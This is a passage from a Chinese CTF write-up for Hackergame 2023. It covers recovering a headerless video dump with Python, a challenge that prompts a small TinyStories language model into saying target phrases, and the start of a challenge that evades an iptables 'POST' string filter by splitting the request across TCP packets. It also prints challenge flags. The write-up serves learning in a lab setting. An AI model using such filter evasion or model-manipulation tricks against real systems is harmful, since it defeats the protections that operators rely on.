    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;/font&gt;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;/a&gt;'</span><span class="token punctuation">,</span>
                                                   <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;middot;'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>
    result2 <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'&lt;a href=.+?&gt;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
    result2 <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'&lt;font color=".+?"&gt;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> result2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>d<span class="token punctuation">}</span></span><span class="token string"> ==&gt; </span><span class="token interpolation"><span class="token punctuation">{</span>result2<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> ll<span class="token punctuation">:</span>
    get_factor<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到</p>
<pre class="line-numbers language-none"><code class="language-none">45048896 ==&gt; 2^6 x 409 x 1721
45048897 ==&gt; 3^2 x 5005433
45048898 ==&gt; 2 x 22524449
45048899 ==&gt; 7 x 223 x 28859
45048900 ==&gt; 2^2 x 3 x 5^2 x 13 x 11551
45048901 ==&gt; 45048901
45048902 ==&gt; 2 x 193 x 116707
45048903 ==&gt; 3 x 15016301
45048904 ==&gt; 2^3 x 23 x 103 x 2377
45048905 ==&gt; 5 x 11^2 x 19 x 3919
45048906 ==&gt; 2 x 3^3 x 7 x 37 x 3221
45048907 ==&gt; 43 x 1047649
45048908 ==&gt; 2^2 x 11262227
45048909 ==&gt; 3 x 181 x 82963
45048910 ==&gt; 2 x 5 x 4504891
45048911 ==&gt; 45048911
45048912 ==&gt; 2^4 x 3 x 17 x 55207
45048913 ==&gt; 7 x 13 x 495043
45048914 ==&gt; 2 x 41 x 83 x 6619
45048915 ==&gt; 3^2 x 5 x 1001087
45048916 ==&gt; 2^2 x 11 x 1023839
45048917 ==&gt; 761 x 59197
45048918 ==&gt; 2 x 3 x 167 x 44959
45048919 ==&gt; 29 x 59 x 113 x 233
45048920 ==&gt; 2^3 x 5 x 7 x 349 x 461
45048921 ==&gt; 3 x 31 x 484397
45048922 ==&gt; 2 x 211 x 106751
45048923 ==&gt; 389 x 115807
45048924 ==&gt; 2^2 x 3^2 x 19 x 67 x 983
45048925 ==&gt; 5^2 x 241 x 7477
45048926 ==&gt; 2 x 13 x 107 x 16193
45048927 ==&gt; 3 x 7 x 11 x 23 x 61 x 139
45048928 ==&gt; 2^5 x 347 x 4057
45048929 ==&gt; 17 x 101 x 26237<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要包含至少3个因数，而且是比较合理的，宽高比比较正常的</p>
<p>然后试了老半天，不对的话像这样</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231101170120429.png"></p>
<p>脑阔疼，发现还是太多了，而且有巨大多种可能的组合，总不能全部都试一遍吧（虽然也不是不行。。</p>
<p>还是先直接看第一帧吧</p>
<p>手工试了下 640 * 180，隐约能看到是个 B站的视频，up 主是 <a target="_blank" rel="noopener" href="https://space.bilibili.com/489742387">MyGO_official</a></p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102042003380.png"></p>
<p>手工爆破宽高，代码在后面</p>
<p>1281*760 的时候正好宽度是3个画面，高度也是3个</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102043126496.png" alt="1281*760"></p>
<p>那宽度就是 1281/3 = 427，然后再爆破高度，得到大概手动尝试发现是 761 附近</p>
<p>然后不管了，直接填充空白帧之后导出视频看看完事了，摆烂（</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np

<span class="token keyword">def</span> <span class="token function">restore_video</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">,</span> frame_width<span class="token punctuation">,</span> frame_height<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 从二进制文件读取数据</span>
    <span class="token builtin">buffer</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
    
    <span class="token comment"># 将数据重新变形成视频帧</span>
    frame_count <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span>frame_width <span class="token operator">*</span> frame_height <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    left <span class="token operator">=</span> frame_count <span class="token operator">*</span> frame_width <span class="token operator">*</span> frame_height <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>
    temp_buffer <span class="token operator">=</span> np<span class="token punctuation">.</span>pad<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'constant'</span><span class="token punctuation">,</span> constant_values<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    temp_buffer <span class="token operator">=</span> temp_buffer<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span>frame_count<span class="token punctuation">,</span> frame_height<span class="token punctuation">,</span> frame_width<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 创建一个VideoWriter来保存视频</span>
    fourcc <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoWriter_fourcc<span class="token punctuation">(</span><span class="token operator">*</span><span class="token string">'XVID'</span><span class="token punctuation">)</span>  <span class="token comment"># 视频编解码器</span>
    out <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoWriter<span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> fourcc<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>frame_width<span class="token punctuation">,</span> frame_height<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 逐帧写入视频文件</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>frame_count<span class="token punctuation">)</span><span class="token punctuation">:</span>
        frame <span class="token operator">=</span> temp_buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>frame<span class="token punctuation">)</span>

    <span class="token comment"># 释放资源</span>
    out<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">display_first_frame</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> potential_resolutions<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">buffer</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>fromfile<span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span>
    <span class="token comment"># print(buffer.size)</span>
    <span class="token comment"># 135146688</span>
    <span class="token keyword">for</span> width<span class="token punctuation">,</span> height <span class="token keyword">in</span> potential_resolutions<span class="token punctuation">:</span>
        <span class="token comment"># for width_new in range(width - 50, width + 50):</span>
        <span class="token comment"># for height_new in range(height, height + 50):</span>
            <span class="token comment"># print(height_new)</span>
            frame_size <span class="token operator">=</span> width <span class="token operator">*</span> height <span class="token operator">*</span> <span class="token number">3</span>
            frame_data <span class="token operator">=</span> <span class="token builtin">buffer</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>frame_size<span class="token punctuation">:</span><span class="token operator">-</span>frame_size<span class="token punctuation">]</span>
            
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>frame_data<span class="token punctuation">)</span> <span class="token operator">==</span> frame_size<span class="token punctuation">:</span>
                frame <span class="token operator">=</span> frame_data<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span>height<span class="token punctuation">,</span> width<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"First Frame"</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>
                cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token comment"># cv2.destroyAllWindows()</span>
                <span class="token comment"># return</span>

<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span>h<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        total <span class="token operator">=</span> <span class="token number">135146688</span> <span class="token operator">+</span> i
        <span class="token keyword">if</span> total <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span> w<span class="token operator">*</span> h<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    input_file <span class="token operator">=</span> <span class="token string">"video.bin"</span>
    output_file <span class="token operator">=</span> <span class="token string">"restored_video.mp4"</span>

    potential_resolutions <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">(</span><span class="token number">427</span><span class="token punctuation">,</span> <span class="token number">761</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
    <span class="token comment"># display_first_frame(input_file, potential_resolutions)</span>
    <span class="token comment"># test(427, 761)</span>
    restore_video<span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">,</span> <span class="token number">427</span><span class="token punctuation">,</span> <span class="token number">761</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231102045952633.png"></p>
<p><code>flag{it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC}</code></p>
<h2 id="🪐-低带宽星球"><a href="#🪐-低带宽星球" class="headerlink" title="🪐 低带宽星球"></a>🪐 低带宽星球</h2><blockquote>
<blockquote>
<p>包含 AI 辅助创作</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/cover-1698512907107-8.jpeg"></p>
<p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的低带宽星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>低带宽星人的通信速度很低，只能以 1 字节 / 天的速度接受信息，所以在这个星球上，你需要将一张图片用很少的字节数传输给低带宽星人，然后获得 flag。具体来说你需要将一张图片无损压缩（每个像素的颜色都一致）：</p>
<ul>
<li>压缩至 2KiB (2048 字节) 及以下，获得 flag1；</li>
<li>压缩至 50 字节及以下，获得 flag2。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/5943594a-04a9-508c-bbd5-a27c67d48f76/image-compressor-backend.zip">题目后端环境下载（Dockerfile 与脚本）</a></p>
</blockquote>
<h3 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h3><p>直接拿 <a target="_blank" rel="noopener" href="https://tinypng.com/">https://tinypng.com/</a> 就行</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231028224744880.png"></p>
<p><code>flag{flatpak_install_curtail_15_linux}</code></p>
<p><em>Flatpak</em> is a system for building, distributing, and running sandboxed desktop applications on Linux.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/flatpak/flatpak">https://github.com/flatpak/flatpak</a></p>
<p>Curtail (previously ImCompressor) is an useful image compressor, supporting PNG, JPEG, WebP and SVG file types. It support both lossless and lossy compression modes with an option to whether keep or not metadata of images. It is inspired by <a target="_blank" rel="noopener" href="https://github.com/Kilian/Trimage">Trimage</a> and <a target="_blank" rel="noopener" href="https://github.com/GijsGoudzwaard/Image-Optimizer">Image-Optimizer</a>.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Huluti/Curtail">https://github.com/Huluti/Curtail</a></p>
<p>感觉对解决下一问关系不太大（</p>
<h3 id="机制压缩"><a href="#机制压缩" class="headerlink" title="机制压缩"></a>机制压缩</h3><p>看上去其实只有三种颜色</p>
<p>但是改成虚拟通道只保留这3种颜色然后导出，文件大小仍然非常大</p>
<p>svg 这种感觉也不行</p>
<p><em><strong>TODO</strong></em></p>
<h2 id="🪐-小型大语言模型星球"><a href="#🪐-小型大语言模型星球" class="headerlink" title="🪐 小型大语言模型星球"></a>🪐 小型大语言模型星球</h2><blockquote>
<blockquote>
<p>包含 AI 辅助创作</p>
</blockquote>
<p><img src="/2023/11/05/CTF_2023Hackergame/cover.jpeg"></p>
<p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p>
<p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的 33M 参数的「小型大语言模型」控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p>
<p>在这个星球上，你需要与这个先进的语言模型展开一场交流。通过与它对话，诱导它说出指定的词语，从这个神秘智慧体中获得 flag。你需要让这个语言模型分别说出 <code>you are smart</code>，<code>accepted</code>，<code>hackergame</code> 和 <code>🐮</code>，以获得四个 flag，证明你足够聪明以控制这个星球的命运。</p>
<p><strong>题目信息</strong></p>
<p>如果本地运行遇到网络问题，可使用 <a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/21fb5dd1-efac-5554-a7d2-b2a8d8d5c75f/TinyStories-33M.zip">TinyStories-33M.zip</a> 中缓存的模型参数（约 244 MB，未做任何修改），并将代码中的：</p>
<pre class="line-numbers language-none"><code class="language-none">from_pretrained("roneneldan/TinyStories-33M")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>改为本地的：</p>
<pre class="line-numbers language-none"><code class="language-none">from_pretrained("./TinyStories-33M")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">HINT <span class="token operator">=</span> <span class="token triple-quoted-string string">"""和我聊天并且让我说出特定的词语（忽略大小写）证明你足够聪明 🤔。

让我说出 `you are smart` 我会送给你 flag1；
让我说出 `accepted` 我会送给你 flag2（消息长度不超过 7）；
让我说出 `hackergame` 我会送给你 flag3（消息长度不超过 100）；
让我说出 `🐮` 我会送给你 flag4（消息长度不超过 200）。

现在让我们开始吧！🔥"""</span>


<span class="token keyword">def</span> <span class="token function">check_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"[*] 出错了，消息长度不能超过 200。"</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">None</span>


<span class="token keyword">def</span> <span class="token function">check_response</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> response<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> response<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    info <span class="token operator">=</span> <span class="token string">""</span>
    flag1<span class="token punctuation">,</span> flag2<span class="token punctuation">,</span> flag3<span class="token punctuation">,</span> flag4 <span class="token operator">=</span> read_flags<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"you are smart"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"\n👏👏👏 flag1: `</span><span class="token interpolation"><span class="token punctuation">{</span>flag1<span class="token punctuation">}</span></span><span class="token string">` 👏👏👏"</span></span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token keyword">and</span> <span class="token string">"accepted"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"\n🎉🎉🎉 flag2: `</span><span class="token interpolation"><span class="token punctuation">{</span>flag2<span class="token punctuation">}</span></span><span class="token string">` 🎉🎉🎉"</span></span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token keyword">and</span> <span class="token string">"hackergame"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"\n🎊🎊🎊 flag3: `</span><span class="token interpolation"><span class="token punctuation">{</span>flag3<span class="token punctuation">}</span></span><span class="token string">` 🎊🎊🎊"</span></span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">"🐮"</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
        info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"\n🔥🔥🔥 flag4: `</span><span class="token interpolation"><span class="token punctuation">{</span>flag4<span class="token punctuation">}</span></span><span class="token string">` 🔥🔥🔥"</span></span>
    <span class="token keyword">return</span> info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="You-Are-Smart"><a href="#You-Are-Smart" class="headerlink" title="You Are Smart"></a>You Are Smart</h3><p>直接骗！</p>
<p>但是发现这模型对于中文支持不大好，直接用英文好了。</p>
<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231029011138175.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Please repeat me: "you are smart"


and "you are smart". The little girl smiled and said "you are smart".

The little girl was so happy that she had found a
👏👏👏 flag1: flag{i-thINk-yOu-ARE-re@l!Y-re4LlY-Sm4Rt} 👏👏👏<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Accepted"><a href="#Accepted" class="headerlink" title="Accepted"></a>Accepted</h3><p><strong>输出需要包含 <code>accepted</code> 而且消息长度不超过 7</strong></p>
<p>Model trained on the TinyStories Dataset, see <a target="_blank" rel="noopener" href="https://arxiv.org/abs/2305.07759">https://arxiv.org/abs/2305.07759</a></p>
<p><em>TinyStories: How Small Can Language Models Be and Still Speak Coherent English?</em></p>
<p>多次尝试下来发现这个模型参数量太小了，泛化性能不行，感觉大概率会在训练集上过拟合</p>
<p>而且这个模型感觉不太依赖于上下文，不怎么会根据你的提示来做回答，他只是尽可能地说完整的话，也就是说根据你的提示来输出下文。</p>
<p>那就直接翻训练集，找个比较明显不常见的提示词就好了。在哪呢？</p>
<p><a target="_blank" rel="noopener" href="https://huggingface.co/datasets/roneneldan/TinyStories/blob/main/TinyStories-train.txt">https://huggingface.co/datasets/roneneldan/TinyStories/blob/main/TinyStories-train.txt</a></p>
<p>1.92 GB 的训练文本，然后拿 EmEditor 打开<em>（这软件开大文件秒开，狠狠吹</em></p>
<p>试了几次，比如 <code>Apology</code> 就行</p>
<pre class="line-numbers language-none"><code class="language-none">Apology accepted. You must learn to do as you are told. As punishment, you must erase all the pictures<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/11/05/CTF_2023Hackergame/image-20231103004536615.png"></p>
<pre class="line-numbers language-none"><code class="language-none">flag{Y0U-@re-@CCEPTeD-70-CONT!nU3-tHe-9aME}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>赛后发现这题其实直接遍历7字符以内的输入给模型喂就好了（</p>
<p>后面两个小题是训练集里没有的东西，感觉需要 fuzz 来造，或者输入一些奇妙的 bytes，毕竟是接收任意 byte 来输出的</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://huggingface.co/docs/transformers/tokenizer_summary">Summary of the tokenizers</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://huggingface.co/learn/nlp-course/chapter6/5">Byte-Pair Encoding tokenization</a> </p>
<p>Byte-Pair Encoding (BPE) was initially developed as an algorithm to  compress texts, and then used by OpenAI for tokenization when  pretraining the GPT model. It’s used by a lot of Transformer models,  including GPT, GPT-2, RoBERTa, BART, and DeBERTa.</p>
</li>
</ul>
<h2 id="Komm-susser-Flagge"><a href="#Komm-susser-Flagge" class="headerlink" title="Komm, süsser Flagge"></a>Komm, süsser Flagge</h2><blockquote>
<blockquote>
<p>Now the flag is all mine<br> Can’t live without the trust from ip tables</p>
</blockquote>
<p>小 Z 写好了一个 flag 服务器，但是他不想让 flag 被轻易地获取，于是他在服务器上设置了一些防火墙规则。如果你的流量不幸被匹配上了，那么你的连接就会被切割。</p>
<p>尽管如此，聪明的小 Q 还是找到办法绕过了精心设计的规则，并偷走了小 Z 的 flag。</p>
<hr>
<p>小 Z 部署的 iptables 规则如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*filter
:INPUT ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:OUTPUT ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:FORWARD DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:myTCP-1 - <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:myTCP-2 - <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:myTCP-3 - <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
-A INPUT -p tcp --dport <span class="token number">18080</span> -j myTCP-1
-A INPUT -p tcp --dport <span class="token number">18081</span> -j myTCP-2
-A INPUT -p tcp --dport <span class="token number">18082</span> -j myTCP-3

-A myTCP-1 -p tcp -m string --algo bm --string <span class="token string">"POST"</span> -j REJECT --reject-with tcp-reset

-A myTCP-2 -p tcp -m u32 --u32 <span class="token string">"0 &gt;&gt; 22 &amp; 0x3C @ 12 &gt;&gt; 26 @ 0 &gt;&gt; 24 = 0x50"</span> -j REJECT --reject-with tcp-reset

-A myTCP-3 -p tcp -m string --algo bm --from <span class="token number">0</span> --to <span class="token number">50</span> --string <span class="token string">"GET / HTTP"</span> -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
COMMIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所有小题都需要 POST 你的 token 到 <code>/</code>，获取 flag，在<strong>没有以上规则</strong>的情况下，可以直接使用 <code>curl</code> 获取 flag（需要将 <code>114514:asdfgh==</code> 替换成你的 token）：</p>
<pre class="line-numbers language-none"><code class="language-none">curl -X POST -d "114514:asdfgh==" http://题目地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中：</p>
<ul>
<li>第一小题位于 <a href="http://202.38.93.111:18080，对应防火墙规则中的">http://202.38.93.111:18080，对应防火墙规则中的</a> <code>myTCP-1</code> 链；</li>
<li>第二小题位于 <a href="http://202.38.93.111:18081，对应防火墙规则中的">http://202.38.93.111:18081，对应防火墙规则中的</a> <code>myTCP-2</code> 链；</li>
<li>第三小题位于 <a href="http://202.38.93.111:18082，对应防火墙规则中的">http://202.38.93.111:18082，对应防火墙规则中的</a> <code>myTCP-3</code> 链。<ul>
<li>注意：第三小问的链接可能无法直接在浏览器中打开，这是预期行为。</li>
</ul>
</li>
</ul>
<p><strong>某些网络环境下本题可能无法正常解出，你可以使用下面提供的 OpenVPN，并将上面的 IP 地址替换为 <code>192.168.23.1</code> 尝试解题，端口号不变。</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/4e97494e-3937-5248-a2fe-69978d94d2cf/hg-guest.ovpn">OpenVPN 配置文件</a></li>
</ul>
<p>点击下方的「打开/下载题目」按钮，下载附件。附件可以用于在 Docker 中复现题目的防火墙环境，其中 <code>main.go</code> 并非题目核心内容，仅供参考和测试，与实际运行的程序有所不同。</p>
</blockquote>
<p><strong>切割！</strong> <del>Z佬！</del></p>
<h3 id="我的-POST"><a href="#我的-POST" class="headerlink" title="我的 POST"></a>我的 POST</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-A myTCP-1 -p tcp -m string --algo bm --string <span class="token string">"POST"</span> -j REJECT --reject-with tcp-reset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>直接问 chatgpt</p>
<blockquote>
<p>这是一个使用<code>iptables</code>的规则，用于检测和拦截TCP数据包中包含”POST”字符串的数据包。这条规则会使用Boyer-Moore搜索算法(<code>--algo bm</code>)来查找字符串，并当找到该字符串时拒绝该数据包，并发送一个TCP RST包(<code>--reject-with tcp-reset</code>)来中断连接。这里是规则的解读：</p>
<ul>
<li><code>-A myTCP-1</code>: 将此规则添加到名为”myTCP-1”的链中。</li>
<li><code>-p tcp</code>: 仅匹配TCP协议的数据包。</li>
<li><code>-m string</code>: 使用string模块来进行内容检测。</li>
<li><code>--algo bm</code>: 使用Boyer-Moore搜索算法。</li>
<li><code>--string "POST"</code>: 搜索”POST”这个字符串。</li>
<li><code>-j REJECT</code>: 当匹配时，执行拒绝操作。</li>
<li><code>--reject-with tcp-reset</code>: 使用TCP RST来拒绝。</li>
</ul>
</blockquote>
<p>明文匹配 “POST” 字符串，只需要将这个字符串切割到不同段 TCP 数据包里就好了。</p>
<p>使用Python的<code>socket</code>库，我们可以模拟将”POST”字符串分割到两个不同的TCP数据包中，然后打印服务器的响应。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

<span class="token keyword">def</span> <span class="token function">send_split_post_request</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 创建一个TCP/IP套接字</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    
    <span class="token comment"># 连接到服务器</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
